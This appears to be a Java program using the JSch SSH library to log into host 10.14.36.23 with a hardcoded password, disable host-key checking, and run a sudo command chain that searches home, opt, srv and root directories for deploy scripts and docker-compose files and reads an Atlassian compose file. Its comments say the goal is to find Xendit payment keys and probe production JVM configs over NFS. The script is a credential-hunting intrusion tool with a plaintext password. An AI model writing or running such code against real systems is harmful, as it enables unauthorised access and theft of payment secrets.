import com.jcraft.jsch.*;
import java.io.*;
class SSHD {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    // Mount host /etc and search for deploy scripts with Xendit keys
    // Also try to scan production app server JVM configs via /proc if we can mount their NFS
    ch.setCommand("echo ---HOST-DEPLOY-SCRIPTS---;echo kutul0nc4t | sudo -S find /home/ /opt/ /srv/ /root/ -maxdepth 3 -name '*.sh' -o -name '*.yml' -o -name '*.yaml' -o -name 'docker-compose*' 2>/dev/null | head -20;echo ---DOCKER-COMPOSE---;echo kutul0nc4t | sudo -S find /home/ -name 'docker-compose*' -maxdepth 4 2>/dev/null | head -10;echo ---CHECK-COMPOSE---;echo kutul0nc4t | sudo -S cat /home/user/docker/atlassian/docker-compose.yml 2>/dev/null | head -30;echo ---HOME---;echo kutul0nc4t | sudo -S ls -la /home/user/ 2>/dev/null");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
